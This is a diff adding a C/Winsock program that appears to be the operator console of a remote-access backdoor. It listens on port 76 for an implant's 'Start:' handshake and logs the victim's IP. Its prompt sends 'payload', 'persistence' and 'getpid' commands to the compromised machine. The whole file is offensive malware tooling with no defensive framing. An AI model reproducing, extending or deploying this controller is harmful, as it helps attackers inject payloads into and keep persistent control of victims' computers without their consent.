@@ -1,0 +1,89 @@
+#include <winsock2.h>
+#include <windows.h>
+#include <stdio.h>
+#include <string>
+char Receive2[255];
+char Sended[255];
+int ret;
+int ret2 = 0;
+char Value[255];
+char Args[10][255];
+WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+{
+	char Receive1[255];
+	char *Commands[] = {"exit", "payload", "persistence", "getpid"};
+	char *CommandNumber[] = {"0", "1", "2", "3"};
+	int Socket;
+	int addrlen;
+	int NewSock, NewSock1, NewSock2, NewSock3;
+	WSADATA WSADate;
+	WSAStartup(514, &WSADate);
+	sockaddr_in SockAddr;
+	sockaddr_in VictimInfo;
+	SockAddr.sin_addr.s_addr = inet_addr("0.0.0.0");
+	SockAddr.sin_port = htons(76);
+	SockAddr.sin_family = AF_INET;
+	Socket = socket(AF_INET, SOCK_STREAM, 0);
+	bind(Socket, (struct sockaddr *)&SockAddr, sizeof(SockAddr));
+	listen(Socket, 3);
+	addrlen = sizeof(SockAddr);
+	printf("Listening on port 76 ...\n");
+	NewSock = accept(Socket, (struct sockaddr *)&SockAddr, &addrlen);
+	recv(NewSock, Receive1, 0xff, 0);
+	while (strcmp("Start:", Receive1)!=0)
+	{
+		closesocket(NewSock);
+		NewSock = accept(Socket, (struct sockaddr *)&SockAddr, &addrlen);
+		recv(NewSock, Receive1, 0xff, 0);
+	}
+	getpeername(NewSock, (struct sockaddr *)&VictimInfo, &addrlen);
+	printf("New connection by %s\n", inet_ntoa(VictimInfo.sin_addr));
+	do
+	{
+		printf("\nImSecure>");
+		scanf("%s", Args[0]);
+		ret = 0;
+		for (int i = 0; i<=3; i++)
+		{
+			if (strcmp(Commands[i], Args[0])==0)
+			{
+				strncpy(Value, CommandNumber[i], strlen(CommandNumber[i]));
+				ret2 = atoi(CommandNumber[i]);
+				switch (ret2)
+				{
+					case 0:
+						printf("[!] - Bye Bye Mr Perplex!\n");
+						send(NewSock, Value, strlen(Value), 0);
+						closesocket(NewSock);
+						closesocket(Socket);
+						WSACleanup();
+						return 0;
+						break;//pro caso de der merda
+					case 1:
+						printf("[*] - Injecting payload...\n");
+						send(NewSock, Value, strlen(Value), 0);
+						ret = recv(NewSock, Receive2, 255, 0);
+						printf("%s\n", Receive2);
+						break;
+					case 2:
+						printf("[*] - Trying persistence!\n");
+						send(NewSock, Value, strlen(Value), 0);
+						ret = recv(NewSock, Receive2, 255, 0);
+						printf("%s\n", Receive2);
+						break;
+					case 3:
+						send(NewSock, Value, strlen(Value), 0);
+						ret = recv(NewSock, Receive2, 255, 0);
+						printf("Current PID: %s\n", Receive2);
+						break;
+				}
+			ret2 = 1;
+			break;
+			}
+		ret2 = 2;
+		}
+		if (ret2==2)printf("Command not valid! 0_0\n");
+	}while(ret!=-1);
+	printf("Connection Closed >_<\n");
+	return 0;
+}
